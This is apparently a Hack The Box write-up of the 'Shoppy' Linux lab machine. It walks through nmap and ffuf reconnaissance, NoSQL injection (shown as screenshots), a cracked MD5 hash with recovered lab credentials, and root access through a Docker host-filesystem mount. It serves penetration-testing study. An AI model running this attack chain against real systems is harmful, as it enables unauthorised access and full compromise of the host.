---
title: "HTB Shoppy"
date: 2026-05-17 11:03 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Linux, Easy]
image: /assets/img/posts/shoppy/shoppy.png
---
**HTB Shoppy** is a Linux machine that starts with subdomain fuzzing to discover a `Mattermost` instance, exploiting `NoSQL injection` on the login and search endpoints to dump user credentials, cracking an `MD5` hash to access `Mattermost` and recover SSH credentials, running a password-protected binary as `deploy` via `sudo` to obtain its plaintext password, and escalating to `root` by abusing `Docker` group membership to mount the host filesystem inside an `alpine` container.

## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.227.233 --min-rate 1000 -nv
```
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat
```
- NSE Scripts & Version
```
nmap -sCV -p22,80,9093 10.129.227.233 --min-rate 1000 -nv
```
```
PORT     STATE SERVICE VERSION                                                                                                                               
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)                                                                                         
| ssh-hostkey:                                                                                                                                               
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)                                                                                               
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)                                                                                              
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)                                                                                            
80/tcp   open  http    nginx 1.23.1                                                                                                                          
|_http-server-header: nginx/1.23.1                                                                                                                           
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-title: Did not follow redirect to http://shoppy.htb                                                                                                   
9093/tcp open  http    Golang net/http server                                                                                                                
|_http-title: Site doesn't have a title (text/plain; version=0.0.4; charset=utf-8).                                                                          
| http-methods:                                                                                                                                              
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                 
|_http-favicon: Unknown favicon MD5: 0899019EEA15047FB6E900BDF21A7A5A
```
### Fuzzing
- subdomain
```
ffuf -u 'http://shoppy.htb/' -H 'Host: FUZZ.shoppy.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 5 -c
```
```
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 148ms]
```
```
ffuf -u 'http://shoppy.htb/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -c -fs 169
```
```
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 206ms]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 210ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 839ms]
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 855ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 846ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 133ms]
fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 126ms]
exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 127ms]
```
- /etc/hosts
```
10.129.227.233   shoppy.htb mattermost.shoppy.htb
```
### injection
![admin](/assets/img/posts/shoppy/inject1.png)

## shoppy.htb
### injection 2
![inject2](/assets/img/posts/shoppy/inject2.png)
### export
![export](/assets/img/posts/shoppy/export.png)
```
josh    6ebcea65320589ca4f2f1ce039975995	md5	remembermethisway
```
## mattermost.shoppy.htb
![shell1](/assets/img/posts/shoppy/meter.png)
```
username: jaeger
password: Sh0ppyBest@pp!
```
## shell as jaeger
```
ssh jaeger@shoppy.htb
```
```
jaeger@shoppy:~$ id
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
```
### road to root
```
jaeger@shoppy:~$ 
/home/deploy/password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped
jaeger@shoppy:~$ strings -e l /home/deploy/password-manager
Sample
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:~$ su deploy
Password: 
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
$ docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   3 years ago   5.53MB 
$ docker run -it -v /:/mnt/root alpine /bin/sh  
/ # ls /mnt/root/root/
root.txt
/ # $ 
```
